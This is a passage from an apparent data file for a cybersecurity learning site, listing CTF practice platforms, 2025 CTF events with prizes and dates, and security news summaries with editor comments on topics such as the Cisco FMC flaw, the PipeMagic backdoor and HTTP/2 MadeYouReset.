    "tags": ["pentesting", "labs", "vms"]
  },
  {
    "id": "picoctf-30",
    "title": "PicoCTF",
    "description": "CTF hosted by Carnegie Mellon, occurs yearly, account required",
    "type": "CTF",
    "category": "Challenge Sites",
    "url": "https://picoctf.com/",
    "difficulty": "Beginner to Intermediate",
    "tags": ["ctf", "competition"]
  },
  {
    "id": "pwnabletw-32",
    "title": "pwnable.tw",
    "description": "Hosts 27 challenges accompanied with writeups, account required",
    "type": "CTF",
    "category": "Challenge Sites",
    "url": "http://pwnable.tw/",
    "difficulty": "Intermediate to Advanced",
    "tags": ["ctf", "pwn", "exploitation"]
  },
  {
    "id": "ringzer0-33",
    "title": "Ringzer0 Team",
    "description": "An account based CTF site, hosting over 272 challenges",
    "type": "CTF",
    "category": "Challenge Sites",
    "url": "https://ringzer0team.com/challenges",
    "difficulty": "Beginner to Advanced",
    "tags": ["ctf", "challenges"]
  },
  {
    "id": "ropemporium-34",
    "title": "ROP Emporium",
    "description": "Return Oriented Programming challenges",
    "type": "Exploitation",
    "category": "Challenge Sites",
    "url": "https://ropemporium.com/",
    "difficulty": "Intermediate to Advanced",
    "tags": ["rop", "exploitation", "binary"]
  },
  {
    "id": "shellterlabs-36",
    "title": "Shellter Labs",
    "description": "Account based infosec labs, they aim at making these activities social",
    "type": "Pentesting",
    "category": "Challenge Sites",
    "url": "https://shellterlabs.com/en/",
    "difficulty": "Beginner to Advanced",
    "tags": ["pentesting", "social"]
  },
  {
    "id": "vulnhub-38",
    "title": "Vulnhub",
    "description": "Site hosts a ton of different vulnerable Virtual Machine images, download and get hacking",
    "type": "Pentesting",
    "category": "Challenge Sites",
    "url": "https://www.vulnhub.com/",
    "difficulty": "Beginner to Advanced",
    "tags": ["pentesting", "vms", "challenges"]
  },

  {
    "id": "tryhackme-40",
    "title": "tryhackme",
    "description": "Awesome platform to start learning cybersecurity, account is needed",
    "type": "Learning",
    "category": "Challenge Sites",
    "url": "https://tryhackme.com",
    "difficulty": "Beginner to Advanced",
    "tags": ["learning", "cybersecurity", "challenges"]
  },
  {
    "id": "webhackingkr-41",
    "title": "webhacking.kr",
    "description": "Lots of web security challenges are available, recommended for beginners. You need to solve a simple challenge to sign up",
    "type": "Web Security",
    "category": "Challenge Sites",
    "url": "https://webhacking.kr",
    "difficulty": "Beginner to Intermediate",
    "tags": ["web-security", "challenges"]
  },

  {
    "id": "stripe-ctf-43",
    "title": "Stripe CTF 2.0",
    "description": "Past security contest where you can discover and exploit vulnerabilities in mock web applications",
    "type": "CTF",
    "category": "Challenge Sites",
    "url": "https://github.com/stripe-ctf",
    "difficulty": "Intermediate to Advanced",
    "tags": ["ctf", "web-security"]
  },
  {
    "id": "lpeworkshop-44",
    "title": "Windows / Linux Local Privilege Escalation Workshop",
    "description": "Practice your Linux and Windows privilege escalation",
    "type": "Pentesting",
    "category": "Challenge Sites",
    "url": "https://github.com/sagishahar/lpeworkshop",
    "difficulty": "Intermediate to Advanced",
    "tags": ["privilege-escalation", "linux", "windows"]
  },
  {
    "id": "hackingarticles-45",
    "title": "Hacking Articles",
    "description": "CTF Brief Write up collection with a lot of screenshots good for beginners",
    "type": "Resources",
    "category": "Write-ups",
    "url": "http://www.hackingarticles.in/ctf-challenges1/",
    "difficulty": "Beginner to Intermediate",
    "tags": ["writeups", "ctf", "resources"]
  },
  {
    "id": "hacker101-46",
    "title": "Hacker101 CTF",
    "description": "CTF hosted by HackerOne, always online. You will receive invitations to some private programs on HackerOne platform as a reward",
    "type": "CTF",
    "category": "Challenge Sites",
    "url": "https://ctf.hacker101.com/",
    "difficulty": "Beginner to Advanced",
    "tags": ["ctf", "hackerone", "bug-bounty"]
  },
  {
    "id": "hackinglab-47",
    "title": "Hacking Lab",
    "description": "European platform hosting lots of riddles, challenges and competitions",
    "type": "CTF",
    "category": "Challenge Sites",
    "url": "https://www.hacking-lab.com/index.html",
    "difficulty": "Beginner to Advanced",
    "tags": ["ctf", "challenges", "competitions"]
  },
  {
    "id": "portswigger-48",
    "title": "Portswigger",
    "description": "Best Platform in order to learn Web Pentesting, account required",
    "type": "Web Security",
    "category": "Challenge Sites",
    "url": "https://portswigger.net/",
    "difficulty": "Beginner to Advanced",
    "tags": ["web-security", "pentesting", "burp"]
  }
  ],

  // CTF events data
  ctfEvents: {
    upcoming: [
      {
    "id": "rctf-2025",
    "name": "RCTF 2025",
    "platform": "CTFtime",
    "startDate": "2025-10-18T02:00:00Z",
    "endDate": "2025-10-20T02:00:00Z",
    "url": "https://rctf.rois.io/",
    "type": "Jeopardy",
    "participants": null,
    "prize": "To be determined",
    "difficulty": null,
    "description": "RCTF 2025 postponed to October due to unfinished preparations including platform testing and challenge polishing. Organized by ROIS to ensure stable and fun competition experience."
  },
  {
    "id": "brunnerctf-2025",
    "name": "BrunnerCTF 2025",
    "platform": "CTFtime",
    "startDate": "2025-08-22T17:30:00Z",
    "endDate": "2025-08-24T17:30:00Z",
    "url": "https://ctf.brunnerne.dk/",
    "type": "Jeopardy",
    "participants": null,
    "prize": "Gift cards, security subscriptions, T-shirts, mugs for top Danish teams",
    "difficulty": "Beginner to Intermediate",
    "description": "First BrunnerCTF featuring fresh challenges in Web, forensics, rev, crypto, pwn, OSINT with secret ingredients. Aimed at home cooks with experience, including 'Shake & Bake' category for beginners and chef's specials for experts. Sponsored by Campfire Security, CyberSkills, Bankdata, Hetzner."
  },
  {
    "id": "hitcon-ctf-2025",
    "name": "HITCON CTF 2025",
    "platform": "CTFtime",
    "startDate": "2025-08-22T19:30:00Z",
    "endDate": "2025-08-24T19:30:00Z",
    "url": "https://ctf2025.hitcon.org/",
    "type": "Jeopardy",
    "participants": null,
    "prize": "1st: $5,000, 2nd: $2,500, 3rd: $1,000 USD",
    "difficulty": "Advanced",
    "description": "HITCON CTF 2025 organized by HITCON team. Details to be announced. High rating weight (100.00) indicates competitive nature for experienced CTF players."
  },
  {
    "id": "sawah-ctf-2025",
    "name": "Sawah Cyber Security CTF 2025",
    "platform": "CTFtime",
    "startDate": "2025-08-23T10:30:00Z",
    "endDate": "2025-08-23T14:30:00Z",
    "url": "https://ctf.sawahcyber.id/",
    "type": "Jeopardy",
    "participants": "Individual only",
    "prize": "1st: 1,000,000 IDR, 2nd: 600,000 IDR, 3rd: 400,000 IDR",
    "difficulty": "Beginner Friendly",
    "description": "4-hour on-site CTF in Bali, Indonesia featuring Web Exploitation, Reverse Engineering, Binary Exploitation, OSINT, and AI challenges. Hosted by PT Sawah Cyber Security to promote cybersecurity awareness in Indonesia. Open to universities, companies, and independent participants."
  },
   {
    "id": "pecan-plus-ctf-2025",
    "name": "PECAN+ CTF 2025",
    "platform": "CTFtime",
    "startDate": "2025-08-24T06:30:00Z",
    "endDate": "2025-08-24T10:30:00Z",
    "url": "https://pecanplus.org/",
    "type": "Jeopardy",
    "format": "On-site",
    "location": "Australia",
    "participants": "High school students (yr 10-12)",
    "prize": "Flipper Zeros, Raspberry Pis, lockpick kits, Arduino kits, micro:bit bundles",
    "difficulty": "Beginner to Intermediate",
    "description": "Australian CTF for high school students led by Edith Cowan University. Collaborative initiative with higher education institutions, cyber security industry, government, teachers and students to raise cyber security awareness, skills and aspirations."
  },
  {
    "id": "tfc-ctf-2025",
    "name": "TFC CTF 2025",
    "platform": "CTFtime",
    "startDate": "2025-08-29T15:30:00Z",
    "endDate": "2025-08-31T15:30:00Z",
    "url": "https://ctf.thefewchosen.com/",
    "type": "Jeopardy", 
    "format": "Online",
    "location": "Remote",
    "participants": null,
    "prize": "Cash prizes, Burp Suite licenses, PEN-200 courses, HTB subscriptions",
    "difficulty": "Beginner to Advanced",
    "description": "Fifth annual CTF by The Few Chosen featuring challenges in Pwn, Reverse, Web, Crypto, and Misc. Designed for both cybersecurity novices and seasoned experts with meticulously engineered platform from scratch."
  },
  {
    "id": "full-weak-engineer-ctf-2025",
    "name": "Full Weak Engineer CTF 2025",
    "platform": "CTFtime",
    "startDate": "2025-08-29T15:30:00Z",
    "endDate": "2025-08-31T15:30:00Z",
    "url": "https://ctf.fwectf.com/",
    "type": "Jeopardy",
    "format": "Online",
    "location": "Remote",
    "participants": null,
    "prize": "Not specified",
    "difficulty": "Beginner to Advanced",
    "description": "Jeopardy-style CTF organized by full weak engineer team featuring challenges in Web, Pwn, Reversing, Crypto, and Forensics/OSINT. Designed to be enjoyable for both beginners and experienced players."
  },
  {
    "id": "blue-arena-2025",
    "name": "Blue Arena",
    "platform": "CSEM CTF",
    "startDate": "2025-08-29T19:34:00Z",
    "endDate": "2025-08-31T20:03:00Z",
    "url": "https://csem.sturtles.in/events/2/",
    "type": "Jeopardy",
    "format": "Online",
    "location": "Remote",
    "participants": "Individual only",
    "prize": "Digital certificates, Hall of Fame placement, NFT badges",
    "difficulty": "Intermediate to Advanced",
    "description": "Forensics-only CTF featuring memory analysis, file carving, log tracing, OSINT challenges. Focused on digital investigation and cyber forensics skills for cybersecurity students and experienced analysts."
  },
  {
    "id": "nns-ctf-2025",
    "name": "NNS CTF 2025",
    "platform": "CTFtime",
    "startDate": "2025-08-29T21:30:00Z",
    "endDate": "2025-08-31T21:30:00Z",
    "url": "https://nnsc.tf/",
    "type": "Jeopardy",
    "format": "Online",
    "location": "Remote",
    "participants": null,
    "prize": "Cash prizes in EUR (open category) and NOK (Norwegian students)",
    "difficulty": "Beginner to Expert",
    "description": "First edition jeopardy-style CTF by Norske Nøkkelsnikere team featuring web, pwn, rev, crypto, blockchain, cloud, mobile, misc challenges. Open to beginners, students, intermediate players, and experts."
  },
  {
    "id": "snakectf-quals-2025",
    "name": "snakeCTF 2025 Quals",
    "platform": "CTFtime",
    "startDate": "2025-08-29T22:30:00Z",
    "endDate": "2025-08-30T22:30:00Z",
    "url": "https://snakectf.org/",
    "type": "Jeopardy",
    "format": "Online",
    "location": "Remote",
    "participants": null,
    "prize": "Finals qualification (prizes TBD)",
    "difficulty": null,
    "description": "Online jeopardy-style CTF qualifier for on-site finals in Italy. Features pwn, web, reversing, crypto, forensics and network challenges. Top teams qualify for November/December 2025 finals."
  },
  {
    "id": "corctf-2025",
    "name": "corCTF 2025",
    "platform": "CTFtime",
    "startDate": "2025-08-30T05:30:00Z",
    "endDate": "2025-09-01T05:30:00Z",
    "url": "https://ctf.cor.team/",
    "type": "Jeopardy",
    "format": "Online",
    "location": "Remote",
    "participants": null,
    "prize": "Cash prizes, Binary Ninja licenses, RET2 Wargames tokens",
    "difficulty": "Advanced",
    "description": "CTF organized by Crusaders of Rust (Starrust Crusaders), American and European security research organization. High rating weight (82.00) indicates competitive nature for experienced teams."
  },
  {
    "id": "nullcon-berlin-hackim-2025",
    "name": "Nullcon Berlin HackIM 2025 CTF",
    "platform": "CTFtime",
    "startDate": "2025-09-04T16:00:00Z",
    "endDate": "2025-09-05T18:30:00Z",
    "url": "https://ctf.nullcon.net/",
    "type": "Jeopardy",
    "format": "Hybrid",
    "location": "Berlin, Germany & Remote",
    "participants": null,
    "prize": "TBA (onsite and possibly online)",
    "difficulty": "Intermediate to Advanced",
    "description": "Conference CTF for Nullcon Berlin 2025 with both onsite and online participation. May include challenges only available onsite. Organized by ENOFLAG."
  },
  {
    "id": "imaginaryctf-2025",
    "name": "ImaginaryCTF 2025",
    "platform": "CTFtime",
    "startDate": "2025-09-06T00:30:00Z",
    "endDate": "2025-09-08T00:30:00Z",
    "url": "https://2025.imaginaryctf.org/",
    "type": "Jeopardy",
    "format": "Online",
    "location": "Remote",
    "participants": null,
    "prize": "TBA",
    "difficulty": "All skill levels",
    "description": "Cybersecurity CTF with challenges in cryptography, binary exploitation, web exploitation, forensics, reversing for all skill levels. Organized by ImaginaryCTF team ([sqrt (-1) + 1])."
  },
  {
    "id": "craccon-2025",
    "name": "CRACCON 2025",
    "platform": "Defhawk",
    "startDate": "2025-09-06T13:30:00Z",
    "endDate": "2025-09-07T13:30:00Z",
    "url": "https://defhawk.com/battleground/raid/craccon-ctf-2025",
    "type": "Jeopardy",
    "format": "Online Qualifier",
    "location": "Remote",
    "participants": null,
    "prize": "Prizes worth ₹4,00,000, CRTP training, TryHackMe Premium, mentorship",
    "difficulty": null,
    "description": "Preliminary round for CRACCON 2025 global participants. Qualifiers advance to offline finals on October 4th in Delhi. Features hacking challenges, workshops, and networking opportunities."
  },
  {
    "id": "asis-ctf-quals-2025",
    "name": "ASIS CTF Quals 2025",
    "platform": "CTFtime",
    "startDate": "2025-09-06T19:30:00Z",
    "endDate": "2025-09-07T19:30:00Z",
    "url": "https://asisctf.com/",
    "type": "Jeopardy",
    "format": "Online",
    "location": "Remote",
    "participants": null,
    "prize": "Not specified",
    "difficulty": "Advanced",
    "description": "ASIS CTF Qualifiers 2025 with high rating weight (96.29), indicating highly competitive nature for top CTF teams worldwide."
  },
  {
    "id": "blackhat-mea-ctf-2025",
    "name": "BlackHat MEA CTF Qualification 2025",
    "platform": "FlagYard",
    "startDate": "2025-09-07T15:30:00Z",
    "endDate": "2025-09-08T15:30:00Z",
    "url": "https://blackhatmea.com/capture-the-flag",
    "type": "Jeopardy",
    "format": "Online Qualifier",
    "location": "Remote",
    "participants": "Teams (500+ participants)",
    "prize": "700,000 SAR total prizes for onsite finals",
    "difficulty": "Amateur, Intermediate, Expert tiers",
    "description": "Black Hat MEA CTF qualification round. Features Web, Reverse Engineering, PWN, Crypto and Forensics challenges. Top 125 teams advance to onsite finals in Riyadh in December 2025."
  },
  {
    "id": "watctf-f25",
    "name": "WatCTF F25",
    "platform": "CTFtime",
    "startDate": "2025-09-10T00:30:00Z",
    "endDate": "2025-09-12T00:30:00Z",
    "url": "https://watctf.org/",
    "type": "Jeopardy",
    "format": "Online",
    "location": "Remote",
    "participants": null,
    "prize": "Not specified",
    "difficulty": "Beginner to Medium",
    "description": "University of Waterloo's Cybersecurity Club jeopardy-style CTF. Primarily aimed at beginner-to-medium level with some hard challenges for skilled players."
  },
  {
    "id": "defcamp-dctf-2025-quals",
    "name": "DefCamp Capture the Flag (D-CTF) 2025 Quals",
    "platform": "CyberEDU",
    "startDate": "2025-09-12T15:30:00Z",
    "endDate": "2025-09-14T15:30:00Z",
    "url": "https://dctf25-quals.cyber-edu.co/",
    "type": "Jeopardy",
    "format": "Online Qualifier",
    "location": "Remote",
    "participants": "Teams only",
    "prize": "Cash prizes, Bucharest finals invitation, accommodation",
    "difficulty": "Entry Level to Insane",
    "description": "DefCamp CTF qualification phase for largest security CTF in Central and Eastern Europe. Features Crypto, Pwning, Reversing, Web, Forensics challenges. Top teams qualify for Attack-Defence finals in Bucharest."
  },
  {
    "id": "null-ctf-2025",
    "name": "Null CTF 2025",
    "platform": "CTFtime",
    "startDate": "2025-12-05T15:30:00Z",
    "endDate": "2025-12-07T15:30:00Z",
    "url": "https://ctf.r0devnull.team/",
    "type": "Jeopardy",
    "format": "Online",
    "location": "Remote",
    "participants": null,
    "prize": "TBA",
    "difficulty": "All skill levels",
    "description": "First edition 48-hour Jeopardy-style CTF by team r0/dev/null. Features Web, Pwn, Crypto, Reverse Engineering, Misc, Forensics challenges. Aimed at all skill levels for fun, learning, and competition."
  },
  {
    "id": "kubanctf-qualifier-2025",
    "name": "KubanCTF Qualifier 2025",
    "platform": "CTFtime",
    "startDate": "2025-08-23T12:30:00Z",
    "endDate": "2025-08-23T22:30:00Z",
    "url": "https://kubanctf2025.ru/",
    "type": "Jeopardy",
    "participants": "Teams up to 5",
    "prize": "1st: 600,000 rubles, 2nd: 400,000 rubles, 3rd: 300,000 rubles",
    "difficulty": "Intermediate to Advanced",
    "description": "Team competition with creative cybersecurity tasks. Top 10 teams advance to semifinals, top 5 to finals at Sirius federal territory. Finals feature Attack-Defense format with free accommodation, meals, and social events for finalists. Organized by Codeby Games."
  },
  {
    "id": "lit-ctf-2025",
    "name": "Lexington Informatics Tournament CTF 2025",
    "platform": "CTFtime",
    "startDate": "2025-08-23T20:30:00Z",
    "endDate": "2025-08-25T20:30:00Z",
    "url": "https://lit.lhsmathcs.org/",
    "type": "Jeopardy",
    "participants": "Teams up to 3",
    "prize": "Cash prizes, WolframAlpha subscriptions, LIT shirts, calculators, and various sponsorships",
    "difficulty": "Beginner Friendly",
    "description": "Jeopardy-style online CTF hosted by LexMACS club from Lexington High School with guest writers. Features CTF Round, Standard Round, Writeups prizes, Game Night, and special categories for middle school and post-HS teams. Multiple sponsors including Google, Trail of Bits, Wolfram, and Texas Instruments."
  },
      {
        id: "1",
        name: "idekCTF 2025",
        platform: "CTFtime",
        startDate: "2025-08-02T00:00:00Z",
        endDate: "2025-08-04T00:00:00Z",
        url: "https://ctf.idek.team/",
        type: "Jeopardy",
        participants: null,
        prize: "Infra sponsored by goo.gle/ctfsponsorship",
        difficulty: null,
        description:
          "The fourth iteration of idekCTF! Prequalifier for MaltaCTF 2025 Finals.",
      },
      {
        id: "2",
        name: "justCTF 2025",
        platform: "CTFtime",
        startDate: "2025-08-02T06:00:00Z",
        endDate: "2025-08-03T19:00:00Z",
        url: "http://2025.justctf.team/",
        type: "Jeopardy",
        participants: null,
        prize: "Cash prizes (details TBA)",
        difficulty: null,
        description:
          "2025 justCTF jeopardy competition. Sponsors: Trail of Bits, OtterSec.",
      },
      {
        id: "3",
        name: "WHY2025 CTF",
        platform: "CTFtime",
        startDate: "2025-08-08T16:00:00Z",
        endDate: "2025-08-11T16:00:00Z",
        url: "https://ctf.why2025.org/",
        type: "Jeopardy",
        participants: null,
        prize: null,
        difficulty: null,
        description:
          "CTF at WHY2025 with both online and on-site challenges for all skill levels.",
      },
      {
        id: "4",
        name: "CSD CTF 2025",
        platform: "CTFtime",
        startDate: "2025-08-08T21:00:00Z",
        endDate: "2025-08-10T21:00:00Z",
        url: "https://cyberstudents.net/ctf",
        type: "Jeopardy",
        participants: null,
        prize: "Minimum $200 prize pool",
        difficulty: "Mixed",
        description:
          "Weekend-long CTF with high school and open brackets. Categories: web, pwn, rev, crypto, forensics, misc.",
      },
      {
        id: "5",
        name: "scriptCTF 2025",
        platform: "CTFtime",
        startDate: "2025-08-16T00:00:00Z",
        endDate: "2025-08-18T00:00:00Z",
        url: "https://ctf.scriptsorcerers.xyz/",
        type: "Jeopardy",
        participants: null,
        prize: "$6000+ prize pool",
        difficulty: "Beginner-friendly",
        description:
          "48-hour jeopardy CTF with mostly beginner friendly challenges. Team limit: 4 members.",
      },
      {
        id: "6",
        name: "SekaiCTF 2025",
        platform: "CTFtime",
        startDate: "2025-08-16T01:00:00Z",
        endDate: "2025-08-18T01:00:00Z",
        url: "https://ctf.sekai.team/",
        type: "Jeopardy",
        participants: null,
        prize: "$15,000+ in prizes",
        difficulty: "Intermediate-Advanced",
        description:
          "Fourth edition serving as prequalifier for MaltaCTF and XCTF Finals. Includes beginner-friendly tasks.",
      },
      {
        id: "7",
        name: "CTFZone 2025 Quals",
        platform: "CTFtime",
        startDate: "2025-08-16T10:00:00Z",
        endDate: "2025-08-17T10:00:00Z",
        url: "https://ctf.bi.zone/",
        type: "Jeopardy",
        participants: null,
        prize: "Top 10 advance to finals ($18k prize pool)",
        difficulty: null,
        description:
          "24-hour online qualifier. Categories: web, pwn, crypto, reverse, PPC. Top 10 proceed to Attack/Defense finals.",
      },
    ],
  },

  // News data
  news: [
  {
    "id": "n1",
    "headline": "Google Project Zero Announces Reporting Transparency Trial Policy to Shorten Upstream Patch Gap",
    "summary": "Google Project Zero is testing a new reporting transparency policy aimed at improving the upstream patch gap.",
    "fullContent": "Google Project Zero is testing a new reporting transparency policy aimed at improving the upstream patch gap, 'the period where an upstream vendor has a fix available, but downstream dependents, who are ultimately responsible for shipping fixes to users, haven't yet integrated it into their end product.' Google's 90+30 policy remains in place; vendors will still have 90 days to address a reported vulnerability, and Google will wait 30 days after the patch has been released to report technical details of the issue. What is different is the early announcement of a vulnerability's existence.",
    "impact": "This change could significantly reduce the window of exposure for vulnerabilities by increasing transparency and putting pressure on vendors to accelerate patch adoption.",
    "category": "Vulnerability Management",
    "subcategory": "Disclosure Policies",
    "date": "2025-07-31",
    "severity": "Medium",
    "source": "SANS NewsBites",
    "authors": ["Google Project Zero"],
    "tags": ["vulnerability disclosure", "patch management", "Google"],
    "references": [
      {
        "title": "Google Project Zero Blog",
        "url": "https://googleprojectzero.blogspot.com"
      },
      {
        "title": "The Record Media",
        "url": "https://therecord.media"
      }
    ],
    "editorNotes": [
      {
        "author": "Neely",
        "comment": "Increased transparency is good, so they can't state they were not informed. This process also tracks any extension requests."
      },
      {
        "author": "Pescatore",
        "comment": "We are long past the point where vulnerabilities can rely on security through obscurity to be hidden."
      }
    ]
  },
   {
    "id": "n1",
    "headline": "Microsoft's Nuance Agrees to Pay $8.5M to Settle MOVEit Breach Lawsuit",
    "summary": "Microsoft subsidiary Nuance settles class action lawsuit for $8.5M over MOVEit file transfer breach affecting 1.225 million people.",
    "fullContent": "Microsoft subsidiary Nuance has agreed to pay $8.5 million to settle a class action lawsuit over the MOVEit file transfer breach. The settlement admits no liability and awaits final approval hearing on March 31, 2026. The lawsuit was filed by customers claiming Nuance didn't adequately protect personal data compromised through the SQL injection vulnerability in Progress Software's MOVEit file transfer software. Nuance, acquired by Microsoft in 2022, is known for medical transcription and speech recognition systems and was one of many organizations breached through the MOVEit vulnerability.",
    "impact": "Sets precedent for third-party liability in supply chain attacks, potentially encouraging more lawsuits against companies using compromised software.",
    "category": "Legal",
    "subcategory": "Data Breach Settlement",
    "date": "2025-08-14",
    "severity": "High",
    "source": "The Register",
    "authors": ["Microsoft", "Nuance"],
    "tags": ["moveit", "lawsuit", "settlement", "supply-chain", "data-breach"],
    "references": [
      {
        "title": "The Register Coverage",
        "url": "https://www.theregister.com"
      },
      {
        "title": "Court Order Document",
        "url": "https://regmedia.co.uk"
      }
    ],
    "editorNotes": [
      {
        "author": "Neely",
        "comment": "You can outsource the function but not the responsibility. This highlights the need for ongoing due diligence on third-party service security configurations."
      },
      {
        "author": "Dukes",
        "comment": "This expands whom claimants can target in supply chain attacks. Microsoft will likely seek recovery from Progress Software."
      }
    ]
  },
  {
    "id": "n2",
    "headline": "Support for Windows 10 Ends in October 2025",
    "summary": "Microsoft reminds users Windows 10 support ends October 14, 2025, with options including Extended Service Update program.",
    "fullContent": "Microsoft reminds customers that Windows 10 support ends on October 14, 2025, giving users under two months to decide next steps. The October 2025 monthly security update will be the last available for Windows 10 versions. After this date, devices will no receive security updates. Microsoft urges upgrading to Windows 11 or cloud migration. For the first time, personal PCs can enroll in Extended Service Update (ESU) program for one additional year at nominal fee (waived with cloud backup or reward points). Office 2016 and Office 2019 support also ends October 24, 2025.",
    "impact": "Millions of devices will become vulnerable to new threats without security updates, requiring urgent migration planning.",
    "category": "End of Life",
    "subcategory": "Operating Systems",
    "date": "2025-08-07",
    "severity": "Critical",
    "source": "Microsoft",
    "authors": ["Microsoft"],
    "tags": ["windows-10", "end-of-life", "security-updates", "migration"],
    "references": [
      {
        "title": "Microsoft Support Announcement",
        "url": "https://learn.microsoft.com"
      },
      {
        "title": "BleepingComputer Coverage",
        "url": "https://www.bleepingcomputer.com"
      }
    ],
    "editorNotes": [
      {
        "author": "Neely",
        "comment": "ESU kicks the can down the road. Inventory systems unable to run Windows 11 and phase in replacements, especially for OT systems."
      },
      {
        "author": "Dukes",
        "comment": "Organizations should upgrade within a year of major updates. Staying on EOL software isn't reasonable cybersecurity."
      }
    ]
  },
  {
    "id": "n3",
    "headline": "NIST Updates Digital Identity Guidelines with AI and Wallet Support",
    "summary": "NIST releases SP-800-63-4 with new user-controlled wallet federation model, AI considerations, and performance metrics.",
    "fullContent": "NIST has finalized the latest revision of Digital Identity Guidelines (SP-800-63-4), addressing significant changes in identity services composition and deployment challenges. The update adds user-controlled wallet federation model, performance metrics for continuous evaluation, and AI/ML considerations for digital identity services. Additionally, NIST published NISTIR 8584 on Face Analysis Technology Evaluation for morph detection, providing strategies to secure identity systems against fraudulent morphed photos used in ID credentials.",
    "impact": "Modernizes identity management standards for AI era, providing guidance on emerging threats like deepfakes and new technologies like passkeys and wallets.",
    "category": "Standards",
    "subcategory": "Identity Management",
    "date": "2025-08-14",
    "severity": "Medium",
    "source": "NIST",
    "authors": ["NIST"],
    "tags": ["nist", "digital-identity", "ai-security", "fido", "passkeys"],
    "references": [
      {
        "title": "NIST Digital Identity Guidelines",
        "url": "https://nvlpubs.nist.gov"
      },
      {
        "title": "Dark Reading Coverage",
        "url": "https://www.darkreading.com"
      }
    ],
    "editorNotes": [
      {
        "author": "Neely",
        "comment": "Guidance addresses deepfakes/AI impact on ID proofing. Passkeys, FIDO, and subscriber wallets are now mature and viable to implement."
      },
      {
        "author": "Murray",
        "comment": "This authoritative guidance makes it harder to continue securing identities only with passwords in the face of increasing threats."
      }
    ]
  },
  {
    "id": "n4",
    "headline": "Plex Urges Immediate Update to Media Server for Security Fix",
    "summary": "Plex releases urgent update for Media Server to fix potential security issue discovered through bug bounty program.",
    "fullContent": "Plex has released Media Server version 1.42.1.10060 with strong recommendation to update immediately to address potential security issue affecting versions 1.41.7.x to 1.42.0.x. The company emailed customers running outdated versions urging update through server management or direct download. No CVE or vulnerability details were provided, but Plex stated the flaw was discovered through their bug bounty program. The rare specific email outreach suggests significant severity. Plex estimates over 25 million users worldwide for their media streaming software.",
    "impact": "Potential widespread compromise of media servers if vulnerability is exploited, affecting millions of users' personal media collections.",
    "category": "Vulnerabilities",
    "subcategory": "Media Software",
    "date": "2025-08-08",
    "severity": "High",
    "source": "Plex",
    "authors": ["Plex"],
    "tags": ["plex", "media-server", "security-update", "bug-bounty"],
    "references": [
      {
        "title": "Plex Security Update",
        "url": "https://forums.plex.tv"
      },
      {
        "title": "BleepingComputer Coverage",
        "url": "https://www.bleepingcomputer.com"
      }
    ],
    "editorNotes": [
      {
        "author": "Neely",
        "comment": "Noteworthy rare outreach from Plex. Users should update to version 1.42.1 immediately via manual download or PMS management."
      }
    ]
  },
  {
    "id": "n5",
    "headline": "Cisco Patches Maximum-Severity Flaw in Firewall Management Center",
    "summary": "Cisco fixes CVSS 10.0 vulnerability in FMC Software allowing unauthenticated RCE via RADIUS authentication exploitation.",
    "fullContent": "Cisco addressed 29 CVEs in August security advisory, including one maximum-severity flaw (CVE-2025-20265, CVSS 10.0) affecting Firewall Management Center Software versions 7.0.7 and 7.7.0. The vulnerability allows unauthenticated remote attackers to execute arbitrary shell commands with high privileges by crafting malicious inputs during RADIUS authentication. Exploitation requires FMC configured for RADIUS authentication for web or SSH management. No workarounds exist; customers must update or consider alternative authentication methods like LDAP or SAML SSO. Discovered during internal testing with no observed exploitation.",
    "impact": "Critical infrastructure at risk if RADIUS-authenticated FMC systems are compromised, potentially leading to network takeover.",
    "category": "Vulnerabilities",
    "subcategory": "Network Security",
    "date": "2025-08-14",
    "severity": "Critical",
    "source": "Cisco",
    "authors": ["Cisco PSIRT"],
    "tags": ["cisco", "fmc", "radius", "rce", "cve-2025-20265"],
    "references": [
      {
        "title": "Cisco Security Advisory",
        "url": "https://sec.cloudapps.cisco.com"
      },
      {
        "title": "The Register Coverage",
        "url": "https://www.theregister.com"
      }
    ],
    "editorNotes": [
      {
        "author": "Neely",
        "comment": "No workarounds - must apply update. Consider migrating from RADIUS to LDAP or SAML SSO. Avoid local accounts due to management risks."
      }
    ]
  },
  {
    "id": "n6",
    "headline": "PipeMagic Backdoor Disguised as ChatGPT Desktop App",
    "summary": "Microsoft discovers PipeMagic modular backdoor masquerading as ChatGPT application, used for ransomware precursor attacks.",
    "fullContent": "Microsoft identified PipeMagic malware actively deployed by threat actors as groundwork for ransomware attacks. The modular backdoor pretends to be ChatGPT Desktop Application while functioning as sophisticated malware framework for flexible payload execution and persistent C2 communication. Discovered during investigation of CVE-2025-29824 Windows CLFS driver vulnerability exploitation, PipeMagic uses DLL hijacking mimicking Google Chrome updates. The malware maintains stealthy, extensible architecture making detection challenging. First observed in 2022, it continues evolving with detailed IoCs available from Microsoft, Kaspersky and BI.ZONE.",
    "impact": "Sophisticated malware campaign targeting AI enthusiasm, potentially leading to ransomware deployment across compromised networks.",
    "category": "Malware",
    "subcategory": "Backdoor",
    "date": "2025-08-18",
    "severity": "High",
    "source": "Microsoft",
    "authors": ["Microsoft Threat Intelligence"],
    "tags": ["pipemagic", "chatgpt", "backdoor", "ransomware", "cve-2025-29824"],
    "references": [
      {
        "title": "Microsoft Analysis",
        "url": "https://www.microsoft.com"
      },
      {
        "title": "The Record Coverage",
        "url": "https://therecord.media"
      }
    ],
    "editorNotes": [
      {
        "author": "Neely",
        "comment": "CVE-2025-29824 patched in April. Verify only legitimate AI tools are installed. EDR should detect PipeMagic using available IoCs."
      },
      {
        "author": "Pescatore",
        "comment": "Would like to know if Microsoft closed other use-after-free flaws before they become zero-day attack paths."
      }
    ]
  },
  {
    "id": "n7",
    "headline": "HTTP/2 'MadeYouReset' Vulnerability Enables Massive DDoS Attacks",
    "summary": "New HTTP/2 Rapid Reset variant allows denial-of-service by tricking servers into resetting their own streams.",
    "fullContent": "Researchers discovered HTTP/2 'MadeYouReset' vulnerability (CVE-2025-8671) allowing DoS attacks without protocol violation by exploiting incorrect stream accounting. Attackers open streams and trigger server resets while backend processing continues, creating unbounded concurrent streams. Affects F5, Apache Tomcat, Netty, IBM, and Jetty implementations. Over 60% of top sites use HTTP/2, carrying approximately one-third of global HTTP traffic. Mitigation requires beyond traditional rate limiting to include strict protocol validation, stream state enforcement, anomaly detection, and connection-level controls.",
    "impact": "Potential for massive DDoS attacks affecting majority of internet services using HTTP/2 protocol for efficient communication.",
    "category": "Vulnerabilities",
    "subcategory": "Protocol Security",
    "date": "2025-08-13",
    "severity": "Critical",
    "source": "Imperva Research",
    "authors": ["Imperva", "Tel Aviv University"],
    "tags": ["http2", "ddos", "rapid-reset", "cve-2025-8671", "protocol-vulnerability"],
    "references": [
      {
